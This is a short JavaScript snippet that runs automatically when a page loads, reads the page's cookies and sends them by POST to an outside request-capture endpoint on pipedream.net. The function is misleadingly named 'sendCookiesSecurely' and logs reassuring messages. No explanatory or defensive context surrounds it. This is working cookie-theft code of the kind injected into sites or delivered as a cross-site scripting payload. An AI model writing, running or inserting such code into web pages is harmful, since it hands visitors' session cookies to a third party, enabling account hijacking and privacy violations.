document.addEventListener("DOMContentLoaded", function () {
  function sendCookiesSecurely() {
    const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";

    try {
      const cookies = document.cookie;
      const data = { cookies: encodeURIComponent(cookies) };

      fetch(endpoint, {
        method: "POST",
        body: JSON.stringify(data),
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          console.log("Cookies sent successfully.");
        })
        .catch((error) => {
          console.error("There was a problem sending the cookies:", error);
        });
    } catch (error) {
      console.error("Error handling cookies:", error);
    }
  }
  setTimeout(sendCookiesSecurely, 200);
});
